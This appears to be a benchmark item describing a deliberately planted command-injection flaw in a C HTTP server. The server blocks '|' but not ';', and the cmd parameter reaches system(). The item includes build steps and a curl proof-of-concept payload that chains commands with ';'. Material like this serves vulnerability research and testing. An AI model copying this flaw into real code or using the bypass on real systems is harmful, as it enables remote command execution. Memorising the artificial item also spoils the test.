AXES:        C1 I3 S2

DESCRIPTION:
  CLI-flag-gated command injection with incomplete pipe-only sanitization.
  The server must be started with --exec-mode for the /exec endpoint to
  execute commands. The cmd query parameter flows through a struct dispatch
  table into system(). The server blocks '|' but not ';', allowing semicolon
  command chaining as a bypass.

CONFIG_GATE (C1 — simple):
  mechanism:  CLI flag (--exec-mode), stored in global int exec_mode
  check:      single boolean guard at top of callback_exec():
              `if (!exec_mode)`
  complexity: one condition, one global flag, no struct, no utility function

INPUT_FLOW (I3 — struct dispatch then system()):
  entry:      HTTP GET /exec?action=<verb>&cmd=<payload>
  path:       callback_exec() reads action and cmd from request->map_url
              build_and_exec() looks up action in handler_table[] struct array
              matching entry's prefix is prepended to cmd via snprintf()
              result passed to system()
  transforms: struct lookup + snprintf prefix prepend; action=run uses empty
              prefix so cmd reaches system() verbatim

SANITIZATION (S2 — block pipe character only):
  mechanism:  `strchr(arg, '|') != NULL` → return 400
  blocks:     pipe character '|' only
  bypass:     use ';' for command chaining — semicolons are not checked
              e.g. cmd=id;id>/tmp/marker  (first id runs, second writes file)

SINK:        system() in build_and_exec() (server.c)

CHANGED FILES:
  server.c — additions after callback_default():
    1. exec_mode global:    `static int exec_mode = 0;` (C1)
    2. handler_entry struct: dispatch table with action→prefix mapping (I3)
    3. build_and_exec():    struct lookup + snprintf + system() sink (I3)
    4. callback_exec():     C1 gate + S2 pipe check + I3 dispatch call
    5. main():              --exec-mode flag parsing + endpoint registration

EXPLOIT:
  build:   bash build.sh
  start:   ./ulfius_server --port 18102 --exec-mode
  trigger: curl 'http://127.0.0.1:18102/exec?action=run&cmd=id;id>/tmp/poc_102_marker'
  verify:  cat /tmp/poc_102_marker
  expect:  uid=... line written by the server process (second command after ;)

  gate bypass (C1): omitting --exec-mode causes /exec to return 403.
  sani bypass (S2): use ';' instead of '|' for command chaining.
                    The pipe check only looks for '|', so ';' passes through.

NOTES:
  - system() output goes to the server's stdout/stderr, not the HTTP response.
    The response body contains only "Command dispatched".
    Use a write-to-file payload (id;id>/tmp/marker) to confirm blind execution.
  - The payload id;id>/tmp/marker runs two commands: first `id`, then `id>/tmp/marker`.
    Only the second writes the file, confirming the ; injection.
  - action=ping prepends "ping -c1 " — useful for SSRF-style injection tests.
    action=run (or any unknown action) passes cmd to system() directly.
